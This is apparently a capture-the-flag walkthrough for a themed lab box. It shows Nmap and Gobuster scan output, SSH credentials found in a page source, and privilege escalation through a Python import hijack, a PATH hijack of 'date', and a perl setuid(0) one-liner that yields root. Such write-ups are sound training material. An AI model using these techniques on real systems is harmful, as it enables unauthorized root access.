@@ -1,0 +1,142 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 15:43 CEST
+Nmap scan report for 10.10.78.200
+Host is up (0.038s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8eeefb96cead70dd05a93b0db071b863 (RSA)
+|   256 7a927944164f204350a9a847e2c2be84 (ECDSA)
+|_  256 000b8044e63d4b6947922c55147e2ac9 (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Follow the white rabbit.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=6/19%OT=22%CT=1%CU=38018%PV=Y%DS=2%DC=T%G=Y%TM=64905BA
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O
+OS:3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=
+OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT      ADDRESS
+1   35.69 ms 10.9.0.1
+2   35.69 ms 10.10.78.200
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.78.200
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/06/19 15:44:32 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/img                  (Status: 301) [Size: 0] [--> img/]
+[2K/index.html           (Status: 301) [Size: 0] [--> ./]
+[2K/r                    (Status: 301) [Size: 0] [--> r/]
+
+===============================================================
+2023/06/19 15:44:50 Finished
+===============================================================
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.78.200/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/06/19 15:46:08 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/img                  (Status: 301) [Size: 0] [--> img/]
+[2K/r                    (Status: 301) [Size: 0] [--> r/]
+[2K/poem                 (Status: 301) [Size: 0] [--> poem/]
+[2K/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
+[2K/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
+[2K/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
+[2K/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
+[2K/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
+
+===============================================================
+2023/06/19 15:51:46 Finished
+===============================================================
+
+
+found some .jpg and .png files on the server and going to further analyze them
+
+
+couldn't download images from browser because of some bug and used:
+curl 'http://10.10.78.200/img/white_rabbit_1.jpg' -o white_rabbit_1.jpg
+
+
+extracted a hint from the white rabbit jpg with stegseek
+stegseek white_rabbit_1.jpg
+
+
+the hint was to follow the r a b b i t which meant to visit the directory /r/a/b/b/i/t
+on that page there seem to be credentials inside of the page source:
+alice:HowDothTheLittleCrocodileImproveHisShiningTail
+
+
+managed to get into ssh with these credentials
+
+
+navigated into /root and got the user.txt flag:
+cat user.txt 
+
+
+there is a python script that returns a random line from a poem and it is owned by root
+i am able to execute that as the only thing on the system 
+
+
+downloaded and ran linpeas to see what else there is
+should check out /usr/bin/gettext.sh
+also /usr/bin/perl and /usr/bin/perl5.26.1
+
+
+i was struggling to figure out where that python script is vulnerable so i looked it up and the vuln lies in the import of
+random. we can create a random.py file in the same dir and it will import that instead.
+
+
+created random.py with 'import os; os.system("/bin/bash")' and ran it as follows:
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+
+so there is a SUID binary in the rabbits home dir which calls 'date' from the PATH
+we need to export /tmp to the path and add our own version of 'date' in there
+
+
+cat /tmp/date 
+#!/bin/bash
+/bin/bash
+
+
+we got a shell as hatter and got a password to connect to ssh as him
+hatter:WhyIsARavenLikeAWritingDesk?
+
+
+now we can exploit the previous thing with /usr/bin/perl having capabilities set
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+
+got a shell as the root user
